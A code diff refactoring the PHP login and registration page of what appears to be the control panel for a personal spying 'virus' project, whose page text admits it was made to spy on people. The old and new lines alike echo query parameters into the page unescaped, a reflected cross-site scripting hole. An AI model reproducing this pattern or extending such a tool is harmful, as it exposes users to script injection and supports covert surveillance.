@@ -1,13 +1,12 @@
 <?php
 
-use Kelvinho\Virus\Authenticator;
 use Kelvinho\Virus\HtmlTemplate;
 use Kelvinho\Virus\Timezone;
 use function Kelvinho\Virus\map;
 
 require_once(__DIR__ . "/../autoload.php");
 
-if (Authenticator::authenticated()) {
+if ($authenticator->authenticated()) {
     header("Location: " . DOMAIN);
 } ?>
 <html lang="en_US">
@@ -21,7 +20,7 @@ if (Authenticator::authenticated()) {
 <label for="login_user_handle">User name</label><input id="login_user_handle" class="w3-input" type="text">
 <br>
 <label for="login_password">Password</label><input id="login_password" class="w3-input" type="password">
-<div style="color: red;"><?php echo @$_GET["loginMessage"]; ?></div>
+<div style="color: red;"><?php echo $requestData->get("loginMessage"); ?></div>
 <h1>Register</h1>
 <br>
 <label for="register_user_handle">User name</label><input id="register_user_handle" class="w3-input" type="text">
@@ -40,7 +39,7 @@ if (Authenticator::authenticated()) {
         <?php }); ?>
     </div>
 </div>
-<div id="register_message" style="color: red;"><?php echo @$_GET["registerMessage"]; ?></div>
+<div id="register_message" style="color: red;"><?php echo $requestData->get("registerMessage"); ?></div>
 <h1>What is this?</h1>
 <p>Oh hi there, I guess you're new around here?</p>
 <p>Long story short, a few years ago, I made my first virus to go and spy on some people. It was mainly for
@@ -81,17 +80,17 @@ if (Authenticator::authenticated()) {
 
     function login() {
         $.ajax({
-            url: "<?php echo DOMAIN_CONTROLLER; ?>/login.php",
+            url: "<?php echo DOMAIN_CONTROLLER; ?>/login",
             type: "POST",
             data: {
                 user_handle: gui.login_user_handle.val().trim(),
                 password: gui.login_password.val().trim()
             },
             success: function () {
-                window.location = "<?php echo DOMAIN_USER; ?>/login.php";
+                window.location = "<?php echo DOMAIN_LOGIN; ?>";
             },
             error: function () {
-                window.location = "<?php echo DOMAIN_USER; ?>/login.php?loginMessage=User%20doesn't%20exist%20or%20password%20is%20wrong";
+                window.location = "<?php echo DOMAIN_LOGIN; ?>?loginMessage=User%20doesn't%20exist%20or%20password%20is%20wrong";
             }
         });
     }
@@ -117,7 +116,7 @@ if (Authenticator::authenticated()) {
             return;
         }
         $.ajax({
-            url: "<?php echo DOMAIN_CONTROLLER; ?>/register.php",
+            url: "<?php echo DOMAIN_CONTROLLER; ?>/register",
             type: "POST",
             data: {
                 user_handle: register_user_handle,
@@ -126,10 +125,10 @@ if (Authenticator::authenticated()) {
                 timezone: timezone
             },
             success: function () {
-                window.location = "<?php echo DOMAIN_USER; ?>/login.php?registerMessage=Register%20successful.%20Please%20log%20in%20now";
+                window.location = "<?php echo DOMAIN_LOGIN; ?>?registerMessage=Register%20successful.%20Please%20log%20in%20now";
             },
             error: function () {
-                window.location = "<?php echo DOMAIN_USER; ?>/login.php?registerMessage=Username%20already%20taken";
+                window.location = "<?php echo DOMAIN_LOGIN; ?>?registerMessage=Username%20already%20taken";
             }
         })
     }
